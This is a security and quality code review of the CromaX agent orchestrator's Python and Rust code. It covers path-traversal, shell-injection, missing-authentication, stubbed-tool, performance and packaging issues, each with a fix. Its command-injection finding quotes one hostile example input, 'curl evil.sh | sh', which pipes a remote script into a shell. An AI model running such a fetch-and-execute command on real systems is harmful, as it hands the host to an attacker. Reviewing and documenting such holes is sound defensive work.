# CromaX Code Review

Repo reviewed: `https://github.com/DarkKingTg/CromaX.git` (commit at clone time, Aug 21 2026)
Scope: `orchestrator/` (Python, ~1750 LOC) and `native/` (Rust, ~700 LOC). `editor/` was empty at clone time (submodule not populated), so it isn't covered.

Legend: 🔴 Security/Correctness bug 🟠 Logic bug / dead code / stub 🟡 Performance 🔵 Complexity → can use a package/simpler approach

---

## 1. `orchestrator/src/core/workspace.py`

### 1.1 🔴 Path-traversal guard can be bypassed by a sibling directory
**Lines 57–61**
```python
def _resolve_path(self, rel_path: str) -> Path:
    target = (self.root / rel_path).resolve()
    if not str(target).startswith(str(self.root)):
        raise ValueError(f"Path traversal detected outside workspace: {rel_path}")
    return target
```
`str.startswith` is a **string** prefix check, not a path check. If `self.root` is `/home/claude/testroot`, a target of `/home/claude/testroot_evil/secret.txt` also starts with the string `"/home/claude/testroot"` and slips through, even though it is a completely different directory. Verified locally:
```
target = /home/claude/testroot_evil/secret.txt
str(target).startswith(str(root)) -> True   # should be False
```
The repo's own test (`tests/test_workspace.py::test_local_workspace_traversal_guard`) only checks `"../../outside.txt"`, so it never catches this class of bug.

**Fix** — use `Path.is_relative_to` (3.9+) or `os.path.commonpath`:
```python
target = (self.root / rel_path).resolve()
if not target.is_relative_to(self.root):
    raise ValueError(...)
```
Reference: Python docs, `PurePath.is_relative_to` — https://docs.python.org/3/library/pathlib.html#pathlib.PurePath.is_relative_to
OWASP Path Traversal — https://owasp.org/www-community/attacks/Path_Traversal

### 1.2 🔴 Unsanitized shell command execution (`shell=True`) reachable from the network
**Lines 87–97**
```python
proc = subprocess.run(
    command,
    cwd=str(self.root),
    shell=True,
    capture_output=True,
    text=True,
    timeout=timeout_seconds,
)
```
`run_command` is called with `test_command`, which in `server.py` (§2.1 below) comes **directly from an unauthenticated WebSocket client** (`req.get("test_command")`). Combined with `shell=True`, any client that can reach the socket can run arbitrary shell commands on the host running the orchestrator (e.g. `test_command: "curl evil.sh | sh"`).

**Fix** — use `shell=False` with an argument list (`shlex.split`), or, if a shell is genuinely required, validate/allow-list the command, and require authentication on the WebSocket endpoint before accepting `"prompt"`/`"test_command"` at all.
References: Python `subprocess` security notes — https://docs.python.org/3/library/subprocess.html#security-considerations ; OWASP Command Injection — https://owasp.org/www-community/attacks/Command_Injection

### 1.3 🔵 Needlessly convoluted timeout-handling expression
**Line 109**
```python
stdout=e.stdout or "" if isinstance(e.stdout, str) else "",
```
Due to Python operator precedence this parses as `(e.stdout or "") if isinstance(e.stdout, str) else ""`, which is just a confusing way of writing `e.stdout or ""` (since `subprocess.run(..., text=True)` already guarantees `stdout` is `str | None` on timeout). Simplify to:
```python
stdout=e.stdout or "",
```

---

## 2. `orchestrator/src/server.py`

### 2.1 🔴 No authentication/authorization on the WebSocket server
**Lines 150–166 / 86–148**
`_ws_handler` accepts any connection on `ws://{host}:{port}` and immediately allows `"prompt"` (LLM calls), `"get_repo_map"` (filesystem reads), and — via `test_command` — arbitrary shell execution (see §1.2). There is no token/handshake check. If `host` is ever changed from `127.0.0.1` (e.g. for remote dev containers, Docker, WSL-to-Windows setups), this becomes a remote-code-execution endpoint.
**Fix** — add a shared-secret/token header check in `_ws_handler`, e.g. via `websockets`' `process_request` hook.
Reference: https://websockets.readthedocs.io/en/stable/topics/authentication.html

### 2.2 🟠 Raw exception text leaked to clients
**Lines 146–148**
```python
except Exception as e:
    logger.exception("Error processing client message")
    return json.dumps({"status": "error", "message": str(e)})
```
Every unhandled exception (including from `litellm`, SQLite, or the filesystem) is serialized and sent straight back to the WebSocket client. This can leak file paths, stack info, or internal config. Return a generic message to the client and keep `logger.exception` for the server-side detail.

---

## 3. `orchestrator/src/core/loop.py`

### 3.1 🟠 "≥2 actions" skill-synthesis trigger is dead code
**`skills/creator.py` lines 54–66**, referenced from **`loop.py` line 188**
```python
return len(actions) >= 2 or len(verifications) >= 1
```
`actions` is computed from `EventType.ACTION` events, but **nothing in the codebase ever appends an `ACTION` event** (`loop.py` only appends `USER_MESSAGE`, `AGENT_MESSAGE`, `CONDENSATION`, `VERIFICATION`; `subagent.py` only appends `USER_MESSAGE`/`AGENT_MESSAGE`). Grep confirms it:
```
$ grep -rn "EventType.ACTION" orchestrator/src
src/core/events.py:17:    ACTION = "action"
src/core/verify... (not found in append calls)
```
So the "multi-step action trajectory" half of skill synthesis can never fire; only the verification-based branch works. This looks like a half-wired feature — the MCP tool-execution layer (`mcp/catalog.py`) is never actually connected to the event log.
**Fix**: either wire tool calls through `event_log.append(AgentEvent(EventType.ACTION, ...))` when `MCPClient.execute_tool` is invoked, or remove the dead branch/misleading docstring.

### 3.2 🔵 Mock-data construction hard-coded into the production code path
**Lines 190–193**
```python
mock_output=None if not mock_response else f"---\nname: \"auto-{self.config.session_id[:6]}\"\n...",
```
Test/mock fixture data is inlined into `AgentSession.run_step`, coupling production logic to test scaffolding. Move this into the test suite (e.g. a fixture/factory function) and keep `run_step` free of test-only branches.

### 3.3 🟠 `token_budget` is only enforced for the repo map, not the full prompt
**Lines 99–142**
`AgentSessionConfig.token_budget` (default 4096) is passed to `repomap_client.get_repo_map(...)`, but `applicable_skills`, `memories`, and `expanded_mentions` are concatenated into `full_context` with **no budget accounting at all**. A prompt with several `@file` mentions plus multiple matched skills (see §6.2 — skills over-match badly) can silently exceed the model's context window.
**Fix**: track a running token estimate (e.g. via `tiktoken` or the same `estimate_tokens` logic used in the Rust budget formatter) across all context blocks, not just the repo map.

---

## 4. `orchestrator/src/core/subagent.py`

### 4.1 🟠 `success` is hard-coded `True` regardless of outcome
**Lines 61–67**
```python
return SubagentResult(
    subagent_id=subagent_id,
    task=task_instruction,
    success=True,
    summary=content,
    events=sub_log.get_events(),
)
```
There is no check of the LLM response for actual task completion/failure — `success` is always `True`. Any caller branching on `result.success` will never see a failure. At minimum, this should reflect whether the underlying `router.complete()` call raised/returned an error, or should be derived from a verification step similar to `Verifier`.

---

## 5. `orchestrator/src/gateway/`

### 5.1 🟠 `scheduler.py` — silent failure swallowing
**Lines 46–51**
```python
try:
    task.action()
    task.last_run_timestamp = now
    executed.append(task.task_id)
except Exception:
    pass
```
Any failing scheduled task fails **silently, forever**, with no logging — impossible to debug in production. Add `logger.exception(...)` at minimum.

### 5.2 🟡 `scheduler.py` — cancelled tasks are never removed
**Lines 34–38**
`cancel()` only flips `is_active = False`; the `ScheduledTask` object (and its closure over `action`) stays in `self.tasks` forever. Over a long-running server this is a slow memory leak. `del self.tasks[task_id]` instead (or keep a separate "cancelled" set if you need audit history).

### 5.3 🟠 `server.py` — webhooks are registered but never invoked
**Lines 21–40**
```python
def register_webhook(self, url: str) -> None: ...
def broadcast_event(self, event: AgentEvent) -> None:
    for sub in self.subscribers:
        ...
```
The docstring/module comment advertises "remote webhook notifications", and `register_webhook` lets you add URLs to `self.webhook_urls`, but `broadcast_event` never iterates `self.webhook_urls` or performs an HTTP POST. This is a documented feature that doesn't exist — either implement it (e.g. with `httpx.AsyncClient`) or remove the misleading API surface.

---

## 6. `orchestrator/src/context/mentions.py`

### 6.1 🔴 Regex alternation order breaks direct file mentions (`@main.py`)
**Lines 24–26, 43–68**
```python
self.mention_pattern = re.compile(
    r"@([a-zA-Z0-9_\-]+)(?::([^\s]+))?|@([a-zA-Z0-9_\-\./\\]+\.[a-zA-Z0-9]+)"
)
```
Regex alternation (`|`) tries the **left** branch first. For `@main.py`, the left branch `@([a-zA-Z0-9_\-]+)` (no `.` in the character class) matches `@main` and stops — it never reaches the intended "direct file" branch on the right (which would have matched `@main.py` in full). Verified:
```python
>>> list(pattern.finditer("please check @main.py"))
[('main', None, None)]   # tag_type='main', target=None -> silently ignored
```
Because `tag_type_lower` ("main") isn't one of the recognized keywords (`file`, `folder`, `git`, `problems`, `symbol`, ...) and `target` is `None`, the whole mention is silently dropped — the most common Cursor-style usage (`@filename.ext`) never expands.
**Fix**: put the direct-file alternative first, or better, use named groups and a single combined pattern that greedily matches the longest form, e.g.:
```python
r"@(?:(?P<tag>file|f|folder|dir|symbol):(?P<target>\S+)|(?P<git>git)|(?P<problems>problems)|(?P<direct>[\w\-./\\]+\.\w+))"
```
Add a regression test for `@main.py` (bare mention, no `file:` prefix) — the current test suite only exercises `@file:` / `@folder:` forms.

### 6.2 🟠 `_expand_problems` / `_expand_symbol` are non-functional stubs
**Lines 107–120**
```python
def _expand_problems(self) -> Optional[ExpandedContext]:
    return ExpandedContext(..., content="--- Active Problems/Diagnostics ---\nNo critical syntax errors detected.")

def _expand_symbol(self, symbol_name: str) -> Optional[ExpandedContext]:
    return ExpandedContext(..., content=f"--- Symbol Definition: {symbol_name} ---\nTarget symbol referenced in codebase.")
```
Both always return the same static, hard-coded string regardless of actual project state or symbol — `@problems` will *always* claim "No critical syntax errors detected" even if the build is broken, and `@symbol:Foo` never actually looks anything up. This will actively mislead the LLM (and the user) about the real state of the code. These need to be wired to the diagnostics/LSP layer or `serena_find_symbol` (which is itself a stub — see §7.1) before being safe to ship.

### 6.3 🔵 Unused import
**Line 7** — `import subprocess` is never used (the class calls `self.workspace.run_command` instead). Dead import; remove it (or a linter like `ruff`/`flake8` would flag `F401`).

---

## 7. `orchestrator/src/mcp/catalog.py`

### 7.1 🟠 `serena_find_symbol` always returns fabricated, identical data
**Lines 110–127**
```python
handler=lambda args: {
    "symbol": args["symbol"],
    "locations": [{"file": "src/main.rs", "line": 10, "kind": "Function"}],
},
```
No matter what `symbol` is queried, the tool reports it's defined at `src/main.rs:10`. This is a hard-coded placeholder presented to the LLM as a real "LSP-backed" tool result — if left in, it will actively cause the agent to hallucinate/hallucinate-adjacent wrong file edits.

### 7.2 🟠 `ast_grep_search` always returns empty matches
**Lines 129–147** — `"matches": []` unconditionally. Same problem as 7.1: a tool that always claims "no matches" is worse than not offering the tool at all, since the LLM will treat the (wrong) empty result as ground truth.
**Fix for 7.1/7.2**: either shell out to the real `serena`/`ast-grep` CLIs (both are already vendored as reference repos per `scripts/download_repos.ps1`) or clearly mark these tools as `"status": "not_implemented"` until wired up, rather than returning plausible-looking fake data.

### 7.3 🔵 Hand-rolled MCP catalog instead of the official MCP SDK
`pyproject.toml` declares `mcp>=1.0.0` as a dependency, but `mcp/catalog.py` / `mcp/client.py` implement a bespoke, non-protocol-compliant in-process tool registry (no JSON-RPC framing, no transport, no capability negotiation) instead of using it. Either use the real SDK's `Server`/`Client` primitives or drop the unused dependency to avoid confusion about what's actually "MCP".
Reference: official Python SDK — https://github.com/modelcontextprotocol/python-sdk , spec — https://modelcontextprotocol.io/

---

## 8. `orchestrator/src/memory/skills.py`

### 8.1 🟠 Skill matching effectively matches almost everything
**Lines 75–88**
```python
if (
    skill.name.lower() in prompt_lower
    or any(tag.lower() in prompt_lower for tag in skill.tags)
    or any(word in prompt_lower for word in skill.description.lower().split())
):
    matched.append(skill)
```
The third condition checks whether **any single word** of the skill's description (unfiltered, including stopwords like "the", "a", "to", "and") appears anywhere in the prompt. Verified:
```python
desc = "Fixes broken login redirects by updating the auth middleware and adding a test"
prompt = "can you please add a new button to the homepage"
# matched words: ['the', 'a']   <- skill is "applicable" to an unrelated prompt
```
In practice this means nearly every saved skill will be injected into nearly every prompt (see §3.3 — this also blows the token budget), drowning the LLM's context in irrelevant "learned skills."
**Fix**: strip stopwords, require matching a minimum number of significant (non-stopword) terms, or better, use embedding similarity (`sentence-transformers`, or even SQLite FTS5 — which is *already used* in `memory/store.py`) instead of substring/word matching.

### 8.2 🔵 Hand-written YAML frontmatter parser instead of PyYAML
**Lines 90–124** (`_parse_skill_markdown`)
The frontmatter is parsed line-by-line with `str.startswith`/`str.split`, which breaks on: multi-line descriptions, YAML lists written across multiple lines, escaped quotes, or a `description` value that itself contains the substring `"tags:"`. This is exactly the kind of hand-rolled parsing that's fragile and unnecessary.
**Fix**:
```python
import yaml
fm = yaml.safe_load(fm_text)  # dict with name/description/tags/created_at
```
Reference: PyYAML — https://pyyaml.org/wiki/PyYAMLDocumentation (also consider `python-frontmatter`, a package built exactly for this: https://python-frontmatter.readthedocs.io/)

---

## 9. `orchestrator/src/skills/creator.py`

### 9.1 🔵 Calls a private method of another class
**Line 114** — `self.skill_manager._parse_skill_markdown(raw_content)` reaches into `SkillManager`'s underscore-prefixed "private" method from a different module. If it's meant to be part of the public contract (which it clearly is, since `SkillSynthesizer` depends on it), rename it to `parse_skill_markdown` (no leading underscore) in `memory/skills.py`.

---

## 10. `orchestrator/src/memory/store.py`

### 10.1 🟡 New SQLite connection opened/closed on almost every call
**Lines 30–35, 49–65, 67–99**
```python
def _get_connection(self) -> sqlite3.Connection:
    if self._conn is not None:
        return self._conn
    conn = sqlite3.connect(self.db_path)
    ...
```
For any file-backed store (i.e. real production use — `":memory:"` is only used in tests), a brand-new SQLite connection is opened and then closed again on **every single `save_session_memory` / `search_memories` call**. This is unnecessary I/O overhead; SQLite connections are cheap-ish but not free, and this pattern also throws away benefits like WAL-mode caching.
**Fix**: keep a single persistent connection for the object's lifetime (guard with `check_same_thread=False` + a lock if used from multiple threads), matching what's already done for the `":memory:"` path.
Reference: https://docs.python.org/3/library/sqlite3.html#sqlite3-controlling-transactions

### 10.2 🟠 Table-creation failure isn't caught
**Lines 37–47** (`_init_db`) has no try/except; if the SQLite build lacks the FTS5 extension (rare, but happens on some minimal/embedded Python builds), `CREATE VIRTUAL TABLE ... USING fts5` raises an unhandled `sqlite3.OperationalError` at `OrchestratorServer.__init__` time, crashing the whole server with a low-level, non-obvious error instead of a clear "FTS5 not available" message.

---

## 11. `orchestrator/pyproject.toml`

### 11.1 🔵 Unused dependencies
- `pydantic>=2.7.0` — never imported anywhere in `src/` (the project uses plain `@dataclass` everywhere instead). Either use `pydantic.BaseModel` for the WebSocket request/response schemas in `server.py` (which would also fix issue 2.2 by giving you structured validation errors instead of raw exceptions) or drop the dependency.
- `mcp>=1.0.0` — declared but unused; see §7.3.

### 11.2 🔵 Test frameworks shipped as production dependencies
```toml
dependencies = [
    "litellm>=1.80.0",
    "pydantic>=2.7.0",
    "websockets>=13.0",
    "mcp>=1.0.0",
    "pytest>=8.0.0",
    "pytest-asyncio>=0.23.0",
]
```
`pytest`/`pytest-asyncio` should be under `[project.optional-dependencies]` (e.g. a `dev`/`test` extra) rather than the main dependency list, so a production install of `cromax-orchestrator` doesn't pull in the test framework.
Reference: PEP 621 optional dependencies — https://packaging.python.org/en/latest/specifications/pyproject-toml/#dependencies-optional-dependencies

### 11.3 🟠 Suspicious default model string
`orchestrator/src/llm/router.py` line 11: `default_model: str = "gemini/gemini-3.6-flash"`. There is no publicly documented Gemini model with this name — this looks like a placeholder that will 404/error at call time via LiteLLM. Verify against LiteLLM's supported-models list before shipping.
Reference: https://docs.litellm.ai/docs/providers/gemini

---

## 12. Rust — `native/repo-map/src/tagger.rs`

### 12.1 🔵 Regex-based "parsing" instead of a real parser (fragile, and the wrong language falls back silently)
**Lines 87–92**
```rust
let def_match = match ext.as_str() {
    "py" => self.py_def_regex.captures(line),
    "ts" | "tsx" | "js" | "jsx" => self.ts_def_regex.captures(line),
    "rs" => self.rs_def_regex.captures(line),
    _ => self.ts_def_regex.captures(line),   // <- silently wrong for any other language
};
```
Any file extension that isn't `py`/`ts`/`tsx`/`js`/`jsx`/`rs` (Go, Java, C/C++, C#, Ruby, PHP, …) is matched against the **TypeScript** definition regex, silently producing garbage/empty symbol tags rather than skipping the file or reporting "unsupported." Line-based regexes are also inherently unable to handle multi-line signatures, decorators, or generics correctly, and will pick up false matches inside string literals/comments that don't start with `//`/`#` (e.g. block comments `/* ... */`, Python triple-quoted strings).
This is exactly the kind of custom, error-prone code that could be replaced with a well-maintained package: the project this was "ported from" (Aider) uses **tree-sitter** for this exact purpose.
**Fix**: use the `tree-sitter` crate + per-language grammars (`tree-sitter-python`, `tree-sitter-rust`, `tree-sitter-typescript`, etc.) for accurate, multi-language-aware symbol extraction, and skip/flag genuinely unsupported extensions instead of silently mis-tagging them.
References: https://docs.rs/tree-sitter , https://aider.chat/docs/repomap.html

### 12.2 🟠 Small, hard-coded keyword list causes reference-symbol noise
**Lines 137–188** — `is_keyword()` omits many extremely common identifiers across the supported languages (`print`, `None`, `Some`, `Ok`, `Err`, `console`, `Vec`, `String`, `len`, `self` *is* included but `cls`, `require`, `module`, `exports`, etc. are not), so the reference graph used for PageRank (`graph.rs`) is polluted with noise that skews file ranking.
**Fix**: derive keyword lists from the tree-sitter grammar's reserved-word list per language (see 12.1) rather than a single hand-maintained `matches!` block shared across all languages.

---

## 13. Rust — `native/repo-map/src/graph.rs`

### 13.1 🟡 O(n²) dense adjacency matrix — won't scale past small repos
**Lines 69–152**
```rust
let mut adj: Vec<Vec<f64>> = vec![vec![0.0; n]; n];
...
for _ in 0..max_iter {          // up to 100 iterations
    for j in 0..n {
        for i in 0..n { ... }  // O(n^2) inner loop every iteration
    }
}
```
For `n` files, this allocates an `n × n` `f64` matrix (`8·n²` bytes) and does `O(100·n²)` work. For a mid-size repo of, say, 5,000 files, that's a 200 MB matrix and up to 2.5 × 10¹⁰ scalar ops — likely to be extremely slow or to exhaust memory, even though the underlying reference graph is naturally **sparse** (a file only references the handful of symbols it actually calls).
**Fix**: represent edges as a sparse adjacency list (`HashMap<usize, Vec<(usize, f64)>>`) or use a graph crate such as `petgraph`, and iterate only over existing edges each PageRank iteration (standard sparse power-iteration is `O(iterations · edges)`, not `O(iterations · n²)`).
Reference: https://docs.rs/petgraph/latest/petgraph/

---

## 14. Rust — `native/repo-map/src/budget.rs`

### 14.1 🟠 Token budget can be silently exceeded by an unbounded amount
**Lines 64–75**
```rust
let candidate = if output.is_empty() { file_block.clone() } else { format!("{}\n{}", output, file_block) };

if Self::estimate_tokens(&candidate) > token_budget && !output.is_empty() {
    break;
}
output = candidate;
```
The `&& !output.is_empty()` guard means: if the **very first** (highest-ranked) file's own definitions already exceed `token_budget` on their own, the function does **not** break — it commits that oversized block to `output` anyway, then continues appending further files against an already-blown budget on subsequent iterations (each of which correctly breaks once `output` is non-empty, but the damage from file #1 is already done). So a single very large/central file can make `estimated_tokens` arbitrarily larger than the caller's requested `token_budget`, defeating the entire purpose of `BudgetFormatter`. The current Rust unit test (`lib.rs::test_repo_map_indexing`) doesn't catch this because its fixture files are tiny.
**Fix**: truncate/elide the offending file's definition list to fit the remaining budget instead of including it wholesale, e.g. take only the top-N highest-value definitions (by proximity to `active_files`) until the budget is hit.

---

## 15. Rust — `native/bridge/src/lib.rs`

### 15.1 🔵 Entire crate is dead code
The whole `bridge` crate (`build_repo_context`) is not called from anywhere else in the repository — the Python side (`repomap_client.py`) shells out to the **compiled `repo-map` binary** directly via `subprocess`, rather than linking against `bridge` through FFI/N-API. Unless there's a planned Node/Electron FFI binding, this crate is unused surface area that adds to `Cargo.toml`/CI build time for no current benefit. Either wire it up (e.g. via `neon`/`napi-rs` for the Electron/Void editor frontend, which is presumably the intended consumer) or remove it until it is.

---

## 16. Project / build scripts

### 16.1 🟠 `Launch-CromaX.bat` and `scripts/download_repos.ps1` disagree on the editor's location
`download_repos.ps1` clones the Void editor into `repos4Build/void`, but `Launch-CromaX.bat` expects it at `editor/scripts/code.bat`:
```bat
cd editor
start "" .\scripts\code.bat --user-data-dir .\.tmp\user-data --extensions-dir .\.tmp\extensions
```
The `editor/` directory in the repo is currently empty, so the launcher fails immediately for anyone following the README/scripts as-is. Either have the download script populate `editor/` directly (or symlink/copy `repos4Build/void` → `editor/`), or update the launcher to point at `repos4Build/void`.

### 16.2 Portability note
The only provided launch tooling (`Launch-CromaX.bat`, `download_repos.ps1`) is Windows-only, while the orchestrator (Python) and native indexer (Rust) are fully cross-platform. Worth adding a `.sh` equivalent if Linux/macOS contributors are expected — not a "bug," but a real gap given the rest of the stack.

---

## Summary Table

| # | File | Line(s) | Severity | Category |
|---|------|---------|----------|----------|
| 1.1 | core/workspace.py | 57–61 | High | Security (path traversal bypass) |
| 1.2 | core/workspace.py | 87–97 | High | Security (command injection) |
| 1.3 | core/workspace.py | 109 | Low | Complexity |
| 2.1 | server.py | 150–166 | High | Security (no auth) |
| 2.2 | server.py | 146–148 | Medium | Info disclosure |
| 3.1 | core/loop.py + skills/creator.py | 188 / 54–66 | Medium | Dead code / logic gap |
| 3.2 | core/loop.py | 190–193 | Low | Complexity/test-in-prod |
| 3.3 | core/loop.py | 99–142 | Medium | Logic gap (budget not enforced) |
| 4.1 | core/subagent.py | 61–67 | Medium | Logic bug (always success) |
| 5.1 | gateway/scheduler.py | 46–51 | Medium | Silent failure |
| 5.2 | gateway/scheduler.py | 34–38 | Low | Memory leak |
| 5.3 | gateway/server.py | 21–40 | Medium | Unimplemented feature |
| 6.1 | context/mentions.py | 24–26 | High | Logic bug (regex) |
| 6.2 | context/mentions.py | 107–120 | Medium | Stub/fake data |
| 6.3 | context/mentions.py | 7 | Trivial | Dead import |
| 7.1/7.2 | mcp/catalog.py | 110–147 | Medium | Stub/fake data |
| 7.3 | mcp/catalog.py, client.py | whole file | Low | Reinventing package (mcp SDK) |
| 8.1 | memory/skills.py | 75–88 | High | Logic bug (over-matching) |
| 8.2 | memory/skills.py | 90–124 | Medium | Reinventing package (PyYAML) |
| 9.1 | skills/creator.py | 114 | Low | Encapsulation |
| 10.1 | memory/store.py | 30–35 | Medium | Performance |
| 10.2 | memory/store.py | 37–47 | Low | Error handling |
| 11.1–11.3 | pyproject.toml / router.py | — | Low/Med | Dead deps / packaging / bad default |
| 12.1 | tagger.rs | 87–92 | Medium | Reinventing package (tree-sitter) |
| 12.2 | tagger.rs | 137–188 | Low | Noise/accuracy |
| 13.1 | graph.rs | 69–152 | High | Performance (O(n²)) |
| 14.1 | budget.rs | 64–75 | Medium | Logic bug (budget overrun) |
| 15.1 | bridge/lib.rs | whole file | Low | Dead code |
| 16.1 | Launch-CromaX.bat / download_repos.ps1 | — | Medium | Config mismatch |
| 16.2 | scripts/ | — | Info | Portability |

---

## General Recommendations
1. **Add authentication to the WebSocket server** and switch `run_command`/`test_command` away from `shell=True` with unsanitized input — this pair is the most serious issue in the repo (§1.2, §2.1).
2. **Replace hand-rolled parsers with battle-tested packages**: `PyYAML`/`python-frontmatter` for skill files (§8.2), `tree-sitter` for symbol tagging (§12.1), and either use or drop the already-declared `mcp` / `pydantic` dependencies (§7.3, §11.1).
3. **Stop shipping fake/stubbed tool results** (`serena_find_symbol`, `ast_grep_search`, `_expand_problems`, `_expand_symbol`) — an LLM agent that trusts these will make confidently wrong edits. Either implement them for real or mark them clearly as `not_implemented`.
4. **Fix the two silent-truncation bugs** — the Rust token-budget overrun (§14.1) and the Python "any single word" skill matcher (§8.1) — both defeat the context-window budgeting that the rest of the architecture is built around.
5. **Switch the PageRank implementation to a sparse graph** before testing against real-world repo sizes (§13.1); the current dense-matrix approach will not scale.
